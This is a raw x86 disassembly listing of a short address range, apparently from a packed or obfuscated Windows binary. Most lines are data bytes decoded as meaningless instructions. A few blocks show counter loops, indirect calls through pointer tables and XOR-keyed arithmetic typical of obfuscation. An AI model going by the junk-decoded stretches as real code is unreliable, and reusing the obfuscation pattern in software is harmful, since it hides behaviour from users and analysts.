  40ab0d:	add    esi,DWORD PTR [edi]
  40ab0f:	push   es
  40ab10:	pop    ecx
  40ab11:	and    al,0xe7
  40ab13:	push   es
  40ab14:	stos   BYTE PTR es:[edi],al
  40ab15:	imul   ebp,DWORD PTR [edi-0x42],0x29c34ad4
  40ab1c:	adc    dl,ah
  40ab1e:	or     bl,ah
  40ab20:	test   BYTE PTR [eax+esi*4+0x64],bh
  40ab24:	jmp    0x40ab7c
  40ab26:	adc    eax,0xf4f102f0
  40ab2b:	xchg   esp,edi
  40ab2d:	add    cl,BYTE PTR [edi-0x13]
  40ab30:	mov    cl,0x80
  40ab32:	popf   
  40ab33:	sub    ah,BYTE PTR ds:0x722049cc
  40ab39:	(bad)  
  40ab3a:	int3   
  40ab3b:	hlt    
  40ab3c:	sbb    al,0xed
  40ab3e:	mov    bh,0xb1
  40ab40:	fiadd  WORD PTR [edx-0x4830d3a2]
  40ab46:	int3   
  40ab47:	xchg   ecx,eax
  40ab48:	inc    ebp
  40ab49:	pop    ecx
  40ab4a:	je     0x40ab31
  40ab4c:	test   al,0x63
  40ab4e:	adc    edi,eax
  40ab50:	fmul   DWORD PTR [ebx+ebp*8+0x3b665f28]
  40ab57:	in     al,0x4d
  40ab59:	retf   
  40ab5a:	ret    0xe22e
  40ab5d:	scas   eax,DWORD PTR es:[edi]
  40ab5e:	sub    esp,ebx
  40ab60:	push   ebp
  40ab61:	popf   
  40ab62:	jmp    0x23a7:0x1edd28e5
  40ab69:	mov    ah,BYTE PTR [edx]
  40ab6b:	adc    BYTE PTR [esi+0xa],ah
  40ab6e:	push   ecx
  40ab6f:	adc    al,0xd8
  40ab71:	push   ecx
  40ab72:	sahf   
  40ab73:	push   ecx
  40ab74:	repnz xor DWORD PTR [esi-0x71eecfc0],esi
  40ab7b:	sahf   
  40ab7c:	xchg   edi,eax
  40ab7d:	adc    ecx,ebx
  40ab7f:	xor    BYTE PTR [edx-0x54f3e15],ch
  40ab85:	mov    eax,ds:0x2e8b3f9d
  40ab8a:	adc    DWORD PTR [edi+0x6deb8205],ebp
  40ab90:	xor    bh,dh
  40ab92:	popf   
  40ab93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab94:	scas   al,BYTE PTR es:[edi]
  40ab95:	push   edi
  40ab96:	lock (bad) 
  40ab98:	aam    0x76
  40ab9a:	or     al,0xc8
  40ab9c:	fs inc esi
  40ab9e:	ret    0x3ce1
  40aba1:	sbb    BYTE PTR [esi+0x8e1abad],ah
  40aba7:	xor    al,0xfb
  40aba9:	cmp    dh,cl
  40abab:	or     eax,0x32171006
  40abb0:	fdivr  DWORD PTR [edx+esi*1+0x19]
  40abb4:	popf   
  40abb5:	imul   ebx,DWORD PTR [eax+0x7d4901ea],0x48
  40abbc:	push   ecx
  40abbd:	jns    0x40abeb
  40abbf:	lods   al,BYTE PTR ds:[esi]
  40abc0:	xchg   esi,eax
  40abc1:	mov    DWORD PTR [esp+edx*4-0x4d4f03a1],esi
  40abc8:	scas   eax,DWORD PTR es:[edi]
  40abc9:	and    eax,0x653cfa25
  40abce:	shr    BYTE PTR [edi-0x69f88695],1
  40abd4:	out    0x1b,eax
  40abd6:	dec    edx
  40abd7:	xchg   ebp,eax
  40abd8:	jle    0x40ac4e
  40abda:	iret   
  40abdb:	and    BYTE PTR [ebp+0x59],bl
  40abde:	add    esp,DWORD PTR [ebx+0x5b12463c]
  40abe4:	ins    DWORD PTR es:[edi],dx
  40abe5:	push   ss
  40abe6:	mov    edi,DWORD PTR [eax+0x52]
  40abe9:	cmc    
  40abea:	sub    ch,BYTE PTR [ecx+0x4074a91c]
  40abf0:	or     DWORD PTR [edx],ebp
  40abf2:	dec    esp
  40abf3:	xor    DWORD PTR [eax-0x4fcab30a],edi
  40abf9:	or     DWORD PTR [ecx],ebp
  40abfb:	dec    esi
  40abfc:	inc    ebp
  40abfd:	xchg   edi,eax
  40abfe:	and    DWORD PTR [eax],eax
  40ac00:	xor    edx,eax
  40ac02:	xor    DWORD PTR ds:0x42fcf5,0x42e70f
  40ac0c:	add    edx,ecx
  40ac0e:	mov    DWORD PTR ds:0x42e703,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fcdd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fd7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fcf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e6f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e6f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e23d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e2f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e6f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e6f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e128,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e128
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e128,ebx
  40acad:	cmp    DWORD PTR ds:0x42e128,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e128,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e2f7
  40acd5:	cmp    DWORD PTR ds:0x42e128,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e128
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e128,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e134
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fce1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fce1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fce1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd01
  40ad3c:	call   DWORD PTR ds:0x42e54b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fce1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fce1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40adee
  40adb4:	xor    ch,0xbe
  40adb7:	add    edi,ebp
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ad70
  40adc0:	xchg   DWORD PTR [ebx+0x34ef1aff],esi
  40adc6:	enter  0xddd2,0x97
  40adca:	sub    al,0x7e
  40adcc:	lock loopne 0x40adeb
  40adcf:	pop    eax
  40add0:	jg     0x40ad95
  40add2:	sbb    eax,0xf1bb3ba0
  40add7:	pop    es
  40add8:	clc    
  40add9:	je     0x40adfa
  40addb:	shl    bl,cl
  40addd:	retf   0xbcd5
  40ade0:	xor    al,0xbb
  40ade2:	mov    esp,0x3d36d6a
  40ade7:	cdq    
  40ade8:	sbb    BYTE PTR [edi+0x9],ch
  40adeb:	test   BYTE PTR [eax+0x7616a021],0xde
  40adf2:	stos   BYTE PTR es:[edi],al
  40adf3:	imul   DWORD PTR [ecx]
  40adf5:	and    DWORD PTR [ecx+0x2d],ebx
  40adf8:	es repnz or cl,ah
  40adfc:	adc    dl,BYTE PTR [edi+eax*4-0x6f]
  40ae00:	dec    esp
  40ae01:	mov    al,ds:0xf32b3a64
  40ae06:	pop    edi
  40ae07:	pusha  
  40ae08:	out    dx,al
  40ae09:	mov    bl,0x4c
  40ae0b:	adc    ecx,0x68d8f83c
  40ae11:	int3   
  40ae12:	ins    BYTE PTR es:[edi],dx
  40ae13:	pop    esi
  40ae14:	mov    edx,0xc50db71d
  40ae19:	test   DWORD PTR [edi-0x2d67fcdf],ebx
  40ae1f:	jnp    0x40ae84
  40ae21:	sbb    al,0xf2
  40ae23:	stc    
  40ae24:	sub    dh,BYTE PTR [ecx+0x33]
  40ae27:	int    0x60
  40ae29:	jne    0x40adbc
  40ae2b:	out    0xc5,eax
  40ae2d:	inc    edx
  40ae2e:	and    ecx,DWORD PTR [ecx]
  40ae30:	mov    dl,0xca
  40ae32:	sbb    dl,al
  40ae34:	pop    edi
  40ae35:	xchg   ebp,eax
  40ae37:	pop    edx
  40ae38:	sbb    bh,BYTE PTR [ecx+0x72]
  40ae3b:	lahf   
  40ae3c:	lea    ecx,[ecx+ebp*1]
  40ae3f:	test   DWORD PTR [si-0xc35],ecx
  40ae44:	scas   al,BYTE PTR es:[edi]
  40ae45:	dec    ecx
  40ae46:	inc    eax
  40ae47:	int3   
  40ae48:	or     al,0xa0
  40ae4a:	out    dx,al
  40ae4b:	sub    BYTE PTR [ecx+edx*1],dh
  40ae4e:	mov    edx,0xe51a5069
  40ae53:	xchg   esp,eax
  40ae54:	shr    BYTE PTR [eax+0x6e],cl
  40ae57:	div    BYTE PTR [esi+0x1fcf2a12]
  40ae5d:	jp     0x40ae76
  40ae5f:	xchg   edx,eax
  40ae60:	dec    ecx
  40ae61:	xor    ah,cl
  40ae63:	movntq QWORD PTR [ebx],mm1
  40ae66:	std    
  40ae67:	retf   
  40ae68:	cdq    
  40ae69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae6b:	mov    ?,WORD PTR [edx+0x3750f759]
  40ae71:	xchg   ebp,eax
  40ae72:	pop    esi
  40ae73:	mov    DWORD PTR [esi+0x5f4f0bb5],eax
  40ae79:	push   ebp
  40ae7a:	mov    cl,0x5f
  40ae7c:	js     0x40aecc
  40ae7e:	xor    esp,DWORD PTR [esi-0x1a08f8c8]
  40ae84:	int    0xda
  40ae86:	outs   dx,BYTE PTR ds:[esi]
  40ae87:	dec    edi
  40ae88:	push   eax
  40ae89:	test   BYTE PTR [eax],dl
  40ae8b:	sar    ebx,1
  40ae8d:	jns    0x40aeea
  40ae8f:	es test al,0x27
  40ae92:	and    eax,0xa2c1925e
  40ae97:	stc    
  40ae98:	push   ds
  40ae99:	imul   ecx,eax,0xffffffe9
  40ae9c:	push   cs
  40ae9d:	mov    ecx,0xed19b29f
  40aea2:	xor    dl,BYTE PTR [edi-0x2226aad5]
  40aea8:	cmp    ah,dh
  40aeaa:	push   edx
  40aeab:	sub    eax,0xe150419
  40aeb0:	pop    es
  40aeb1:	pop    ss
  40aeb2:	fld    DWORD PTR [edi+0x10]
  40aeb5:	loopne 0x40ae65
  40aeb7:	or     eax,DWORD PTR [edx]
  40aeb9:	add    bl,ah
  40aebb:	mov    ecx,0x844de6aa
  40aec0:	sbb    al,0x42
  40aec2:	add    DWORD PTR ds:0x75256723,ecx
  40aec8:	sub    eax,0x7eccbb12
  40aecd:	ja     0x40aeaa
  40aecf:	cs push ebp
  40aed1:	inc    eax
  40aed2:	nop
  40aed3:	icebp  
  40aed4:	mov    ebx,0x47859b1e
  40aed9:	mov    esi,0xbe45e93f
  40aede:	test   al,0x54
  40aee0:	retf   0x340c
  40aee3:	mov    esi,0x3f4159e5
  40aee8:	add    cl,BYTE PTR [ecx+0x1d21758b]
  40aeee:	jecxz  0x40af53
  40aef0:	out    0xee,eax
  40aef2:	lahf   
  40aef3:	sbb    DWORD PTR [ebp+0x7fb7de2a],0x1
  40aefa:	inc    eax
  40aefb:	(bad)  [ecx-0x77dd164b]
  40af01:	dec    esi
  40af02:	xchg   ebx,eax
  40af03:	les    esi,FWORD PTR [ebp-0x2a]
  40af06:	in     eax,dx
  40af07:	add    esp,DWORD PTR [ebx+0x3d54e78e]
  40af0d:	or     eax,0xd8a02121
  40af12:	fild   DWORD PTR [ecx+ebx*2]
  40af15:	lea    ebp,[ebx]
  40af17:	xchg   esp,edx
  40af19:	loope  0x40af63
  40af1b:	ret    0x5da9
  40af1e:	mov    esp,0x9abf545a
  40af23:	stc    
  40af24:	jecxz  0x40af9a
  40af26:	stos   DWORD PTR es:[edi],eax
  40af27:	test   eax,0xd49de4ab
  40af2c:	mov    al,0x26
  40af2e:	adc    ebp,ebp
  40af30:	sbb    al,0xd8
  40af32:	mov    dh,0xf5
  40af34:	inc    ecx
  40af35:	pop    ebp
  40af36:	jle    0x40aebf
  40af38:	xor    DWORD PTR [edi+eax*8],edi
  40af3b:	loopne 0x40aef2
  40af3d:	dec    esi
  40af3e:	clc    
  40af3f:	mov    eax,0x483b6cbf
  40af44:	xchg   ebp,edx
  40af46:	push   ds
  40af47:	pushf  
  40af48:	es xor esp,DWORD PTR cs:[edi+0x6d0ac4dc]
  40af50:	nop
  40af51:	dec    esi
  40af52:	fadd   DWORD PTR [edx]
  40af54:	sti    
  40af55:	xchg   esi,eax
  40af56:	cwde   
  40af57:	ds inc ecx
  40af59:	data16 jg 0x40af90
  40af5c:	int3   
  40af5d:	mov    bl,0x98
  40af5f:	loopne 0x40aef2
  40af61:	je     0x40aefe
  40af63:	jns    0x40af7a
  40af65:	push   edx
  40af66:	mov    dl,0x99
  40af68:	aaa    
  40af69:	in     al,dx
  40af6a:	lahf   
  40af6b:	jbe    0x40af17
  40af6d:	mov    eax,DWORD PTR [esi]
  40af6f:	not    BYTE PTR [ecx-0x38]
  40af72:	dec    esi
  40af73:	sub    esp,0xffffffd9
  40af76:	lahf   
  40af77:	xchg   esi,eax
  40af78:	(bad)  
  40af79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af7a:	pop    ecx
  40af7b:	pop    edi
  40af7c:	cmp    eax,0x2e16f713
  40af81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af82:	add    al,0xdc
  40af84:	pop    ebp
  40af85:	dec    edx
  40af86:	repnz enter 0x4575,0x41
  40af8b:	xchg   DWORD PTR ds:0x43156f05,edi
  40af91:	int    0xb1
  40af93:	cmp    DWORD PTR [edx+0x4e],0x2a2cfd7
  40af9a:	push   0x6288b5e
  40af9f:	mov    esp,0x8b4ebfba
  40afa4:	lds    esi,FWORD PTR [edi-0x8]
  40afa7:	dec    esp
  40afa8:	sub    DWORD PTR [edx-0x4a244a5f],ebp
  40afae:	cmp    edx,esi
  40afb0:	sub    dl,bh
  40afb2:	icebp  
  40afb3:	div    BYTE PTR [edx-0x31944e45]
  40afb9:	mov    cs,ebx
  40afbb:	cwde   
  40afbc:	repz out dx,al
  40afbe:	fmul   DWORD PTR [eax+0x78]
  40afc1:	rcl    DWORD PTR [ebx],cl
  40afc3:	lds    edx,FWORD PTR [edi+esi*4+0x32b608af]
  40afca:	loope  0x40afe7
  40afcc:	call   0x63ec8fff
  40afd1:	cmp    al,0x2f
  40afd3:	scas   eax,DWORD PTR es:[edi]
  40afd4:	sbb    al,BYTE PTR [eax]
  40afd6:	hlt    
  40afd7:	xchg   esp,eax
  40afd8:	pushf  
  40afd9:	xor    BYTE PTR [esi],ah
  40afdb:	daa    
  40afdc:	and    dh,0x6b
  40afdf:	pop    esi
  40afe0:	icebp  
  40afe1:	push   esi
  40afe2:	in     eax,dx
  40afe3:	sub    BYTE PTR [eax-0x66546575],al
  40afe9:	and    BYTE PTR [ecx+0x67],bh
  40afec:	and    DWORD PTR [ebx+eax*4+0x12c419ed],edx
  40aff3:	push   edx
  40aff4:	test   al,0x2e
  40aff6:	mov    esp,0xa31c9810
  40affb:	js     0x40b024
  40affd:	cmc    
  40affe:	ss dec edi
  40b000:	hlt    
  40b001:	js     0x40b054
  40b003:	nop
  40b004:	(bad)  
  40b005:	jmp    0xe8e61346
  40b00a:	les    edi,FWORD PTR [esi-0x5ec95199]
  40b010:	ins    BYTE PTR es:[edi],dx
  40b011:	add    DWORD PTR [edi+0x60],edi
  40b014:	cwde   
  40b015:	fmul   QWORD PTR [ebx-0x4a4abf9]
  40b01b:	add    BYTE PTR [edx+0x6eda41c3],cl
  40b021:	add    DWORD PTR [eax+0x39],edx
  40b024:	scas   eax,DWORD PTR es:[edi]
  40b025:	test   DWORD PTR [edi-0x4dd13055],ecx
  40b02b:	outs   dx,DWORD PTR ds:[esi]
  40b02c:	js     0x40aff9
  40b02e:	jmp    0xa03e3f06
  40b033:	sbb    ah,bh
  40b035:	adc    BYTE PTR [edi+edi*1-0x7b0e0d40],0x4b
  40b03d:	pop    esi
  40b03e:	ret    0xd6d6
  40b041:	push   0xe5d9070e
  40b046:	(bad)  
  40b047:	(bad)  
  40b048:	call   0xae1be7ac
  40b04d:	mov    ds:0xe85f4f5e,eax
  40b052:	pop    ecx
  40b053:	repz xchg esp,eax
  40b055:	push   cs
  40b056:	rcl    DWORD PTR [edi+0x7a865203],0xad
  40b05d:	fsubr  st,st(0)
  40b05f:	cdq    
  40b060:	hlt    
  40b061:	not    esp
  40b063:	pop    edx
  40b064:	in     eax,0xf1
  40b066:	mov    eax,0x44589e2c
  40b06b:	aad    0x2f
  40b06d:	daa    
  40b06e:	(bad)  
  40b070:	jmp    0x6f8dc1fe
  40b075:	ins    DWORD PTR es:[edi],dx
  40b076:	jl     0x40b033
  40b078:	sub    al,0xe8
  40b07a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b07b:	xchg   BYTE PTR [ecx+edi*1],bl
  40b07e:	ins    BYTE PTR es:[edi],dx
  40b07f:	sub    esp,esp
  40b081:	adc    DWORD PTR [esi],ebp
  40b083:	add    BYTE PTR [esi-0x63],bl
  40b086:	lds    eax,FWORD PTR [eax-0x18e2f9a8]
  40b08c:	out    dx,al
  40b08d:	mov    eax,ds:0x218de7fd
  40b092:	test   BYTE PTR [ecx+ebp*8-0x4d],dl
  40b096:	and    eax,0x3a730bce
  40b09b:	int3   
  40b09c:	inc    ebx
  40b09d:	or     eax,DWORD PTR [edx]
  40b09f:	inc    ax
  40b0a1:	scas   al,BYTE PTR es:[edi]
  40b0a2:	es (bad) 
  40b0a4:	jecxz  0x40b0ac
  40b0a6:	in     eax,0x4c
  40b0a8:	xchg   ebx,eax
  40b0a9:	call   0x3cacfc17
  40b0ae:	mov    al,0x61
  40b0b0:	add    al,0xb5
  40b0b2:	loope  0x40b058
  40b0b4:	jecxz  0x40b056
  40b0b6:	cmc    
  40b0b7:	rcr    DWORD PTR [ebx+0x70401320],1
  40b0bd:	xor    eax,0x3dd808f1
  40b0c2:	ins    DWORD PTR es:[edi],dx
  40b0c3:	add    DWORD PTR [ebx-0x392e8cda],edi
  40b0c9:	es fwait
  40b0cb:	loopne 0x40b103
  40b0cd:	sub    al,0x7c
  40b0cf:	int3   
  40b0d0:	test   DWORD PTR [edx+0x422ff7b1],esi
  40b0d6:	pop    ss
  40b0d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0d8:	lds    edi,FWORD PTR [eax]
  40b0da:	push   esi
  40b0db:	cld    
  40b0dc:	cmp    al,0x86
  40b0de:	add    BYTE PTR [ebx-0x4d],0xcc
  40b0e2:	test   eax,0x73a918c4
  40b0e7:	and    BYTE PTR [ebx-0x28],0x7e
  40b0eb:	push   edx
  40b0ec:	scas   eax,DWORD PTR es:[edi]
  40b0ed:	shl    DWORD PTR [ebx-0x22c0c44e],0xe0
  40b0f4:	xor    BYTE PTR [ecx],bh
  40b0f6:	xor    ah,BYTE PTR [edi-0x39]
  40b0f9:	xchg   edi,eax
  40b0fa:	add    BYTE PTR [ebx],cl
  40b0fc:	cmp    al,0xb8
  40b0fe:	add    eax,0x8be702fc
  40b103:	repnz pop ss
  40b105:	pushf  
  40b106:	fidivr WORD PTR [edx]
  40b108:	and    BYTE PTR [esi],dl
  40b10a:	jg     0x40b156
  40b10c:	lea    edi,[ebx]
  40b10e:	sti    
  40b10f:	cmp    dh,BYTE PTR [ebx+0x39cf5bbc]
  40b115:	fidiv  DWORD PTR [edx]
  40b117:	or     DWORD PTR [ebx+0x3b],0xf5a42211
  40b11e:	add    BYTE PTR [ebx+0x2d],0xa7
  40b122:	jl     0x40b12d
  40b124:	ins    DWORD PTR es:[edi],dx
  40b125:	pop    esp
  40b126:	sub    eax,0x75685802
  40b12b:	ins    BYTE PTR es:[edi],dx
  40b12c:	add    edi,DWORD PTR [edx+0x1f980af1]
  40b132:	mov    WORD PTR [ecx+0x301ed4df],ax
  40b139:	jno    0x40b0e0
  40b13b:	(bad)
  40b13e:	ja     0x40b139
  40b140:	push   0x8a39d93b
  40b145:	out    0xd1,eax
  40b147:	push   ecx
  40b148:	je     0x40b110
  40b14a:	xchg   esi,eax
  40b14b:	arpl   WORD PTR [edx],bx
  40b14d:	add    bl,BYTE PTR [esi+0x1b]
  40b150:	pop    esp
  40b151:	retf   
  40b152:	xor    al,0xd1
  40b154:	or     dl,BYTE PTR [edx]
  40b156:	loop   0x40b1b4
  40b158:	pop    ss
  40b159:	or     ecx,eax
  40b15b:	mov    ebx,0xe0bac94c
  40b160:	add    edx,ecx
  40b162:	jmp    0x40b520
  40b167:	shl    BYTE PTR [ebp+0x37],cl
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	jae    0x40b188
  40b175:	or     edi,ebx
  40b177:	mov    ds:0x9f7070fa,al
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b10a
  40b180:	scas   al,BYTE PTR es:[edi]
  40b181:	ins    DWORD PTR es:[edi],dx
  40b182:	sbb    BYTE PTR [ebx],bl
  40b184:	sbb    al,0x79
  40b186:	in     al,dx
  40b187:	jnp    0x40b1f5
  40b189:	xlat   BYTE PTR ds:[ebx]
  40b18a:	mov    cl,0x1a
  40b18c:	sti    
  40b18d:	rcl    DWORD PTR [edi],0xac
  40b190:	fisub  WORD PTR [ecx+0x2f]
  40b193:	inc    ebx
  40b194:	mov    edi,0x48f09877
  40b199:	retf   
  40b19a:	cmp    BYTE PTR [ebp-0x17],al
  40b19d:	stos   DWORD PTR es:[edi],eax
  40b19e:	push   ds
  40b19f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1a0:	push   eax
  40b1a1:	lods   eax,DWORD PTR ds:[esi]
  40b1a2:	xchg   ecx,eax
  40b1a3:	sub    eax,0xc5a44624
  40b1a8:	mov    bh,ch
  40b1aa:	or     ch,BYTE PTR [edi]
  40b1ac:	xchg   ecx,eax
  40b1ad:	pop    edi
  40b1ae:	enter  0x26c4,0x4b
  40b1b2:	sub    ebp,DWORD PTR [ebx-0x19]
  40b1b5:	in     eax,0xc0
  40b1b7:	scas   eax,DWORD PTR es:[edi]
  40b1b8:	mov    eax,0x7089a2d
  40b1bd:	or     edx,edx
  40b1bf:	sub    BYTE PTR [ecx+ebx*1-0x69c8e03e],dl
  40b1c6:	and    DWORD PTR [edi+0x56],ebp
  40b1c9:	xlat   BYTE PTR ds:[ebx]
  40b1ca:	(bad)  
  40b1cb:	(bad)  
  40b1cc:	pop    esi
  40b1cd:	xor    esp,DWORD PTR [ebx]
  40b1cf:	inc    esp
  40b1d0:	jl     0x40b212
  40b1d2:	sub    eax,0xd7dda6b5
  40b1d7:	lds    ebx,FWORD PTR [ecx-0x7a]
  40b1da:	out    0x65,eax
  40b1dc:	and    bh,0xc8
  40b1df:	mov    al,ds:0x4e0021d6
  40b1e4:	(bad)  
  40b1e5:	in     eax,dx
  40b1e6:	inc    ebp
  40b1e7:	push   eax
  40b1e8:	fsubr  QWORD PTR [edi+0x7c]
  40b1eb:	(bad)  
  40b1ec:	jno    0x40b1d9
  40b1ee:	rcl    DWORD PTR [edx+ecx*1],1
  40b1f1:	push   es
  40b1f2:	mov    ecx,0x6867535b
  40b1f7:	and    BYTE PTR [edx],dh
  40b1f9:	retf   0x892b
  40b1fc:	jp     0x40b1d7
  40b1fe:	pop    ebx
  40b1ff:	inc    esi
  40b200:	add    ebp,edx
  40b202:	jmp    0x40b280
  40b204:	pop    ss
  40b205:	in     eax,0x24
  40b207:	in     al,0x79
  40b209:	addr16 or eax,ebp
  40b20c:	arpl   WORD PTR [esi-0x5b],cx
  40b20f:	mov    al,0x44
  40b211:	not    DWORD PTR cs:[edx]
  40b214:	repnz add BYTE PTR [edx-0x26],ah
  40b218:	mov    eax,ds:0xdc44951f
  40b21d:	adc    eax,0x24b946cd
  40b222:	mov    edi,edi
  40b224:	cmp    esi,esp
  40b226:	sub    al,0x9d
  40b228:	fnstcw WORD PTR cs:[esi+0x51]
  40b22c:	xor    ebp,edi
  40b22e:	cmc    
  40b22f:	jecxz  0x40b20e
  40b231:	mov    esp,0x5237e6ec
  40b236:	mov    dl,0x80
  40b238:	mov    ch,0xf0
  40b23a:	mov    dl,0xa3
  40b23c:	inc    eax
  40b23d:	cdq    
  40b23e:	xor    al,al
  40b240:	add    ecx,DWORD PTR [eax-0x51f9e0dc]
  40b246:	sbb    ecx,edx
  40b248:	push   ds
  40b249:	jbe    0x40b24b
  40b24b:	and    BYTE PTR [ecx+0x52da3f77],0xa5
  40b252:	das    
  40b253:	add    al,0xe8
  40b255:	add    al,0x4f
  40b257:	add    BYTE PTR [ecx-0x7fb52cf0],cl
  40b25d:	cmp    al,0xb5
  40b25f:	test   BYTE PTR [eax+0x66],al
  40b262:	jmp    0x40b25c
  40b264:	inc    eax
  40b265:	mov    ebp,0x1405b18c
  40b26a:	lahf   
  40b26b:	sahf   
  40b26c:	test   dl,al
  40b26e:	lds    ecx,FWORD PTR [ebp-0x4e]
  40b271:	ds jb  0x40b2ad
  40b274:	jb     0x40b206
  40b276:	sbb    DWORD PTR [eax],esp
  40b278:	jp     0x40b295
  40b27a:	add    BYTE PTR [eax],dl
  40b27c:	(bad)  
  40b27d:	fnstenv [edi+edx*8+0x49]
  40b281:	or     edx,DWORD PTR [edi+0x61]
  40b284:	xchg   edi,eax
  40b285:	add    ah,ch
  40b287:	or     al,0x3e
  40b289:	or     esi,ebp
  40b28b:	inc    eax
  40b28c:	mul    DWORD PTR [edi-0x59870bb8]
  40b292:	push   ecx
  40b293:	push   cs
  40b294:	out    0xc5,eax
  40b296:	pop    esp
  40b297:	sahf   
  40b298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b299:	jmp    0x234e028f
  40b29e:	scas   al,BYTE PTR es:[edi]
  40b29f:	lods   eax,DWORD PTR ds:[esi]
  40b2a0:	rcr    DWORD PTR [ebx+0x3bfbd58b],1
  40b2a6:	gs and eax,0x72b1deee
  40b2ac:	int    0xb
  40b2ae:	les    eax,FWORD PTR [edx-0x6]
  40b2b1:	sbb    DWORD PTR [edx],ecx
  40b2b3:	and    ebp,DWORD PTR [eax-0x18]
  40b2b6:	shl    ch,cl
  40b2b8:	out    0xcc,eax
  40b2ba:	pop    ebx
  40b2bb:	stos   DWORD PTR es:[edi],eax
  40b2bc:	pop    edi
  40b2bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2be:	test   al,0xcd
  40b2c0:	mov    dh,0x60
  40b2c2:	mov    eax,ds:0xf426bd08
  40b2c7:	or     ecx,0xf921e7d7
  40b2cd:	aaa    
  40b2ce:	and    ebp,DWORD PTR ds:0x679c368d
  40b2d4:	inc    ebp
  40b2d5:	fdiv   DWORD PTR [edi+0x1ab82f21]
  40b2db:	js     0x40b28a
  40b2dd:	sub    esi,ecx
  40b2df:	fs mov esi,0x3daab189
  40b2e5:	in     al,0xc8
  40b2e7:	data16 or BYTE PTR [eax],ah
  40b2ea:	dec    ecx
  40b2eb:	jecxz  0x40b369
  40b2ed:	jmp    0x40b336
  40b2ef:	push   edi
  40b2f0:	popf   
  40b2f1:	das    
  40b2f2:	xchg   edi,eax
  40b2f3:	jb     0x40b373
  40b2f5:	fiadd  WORD PTR [eax]
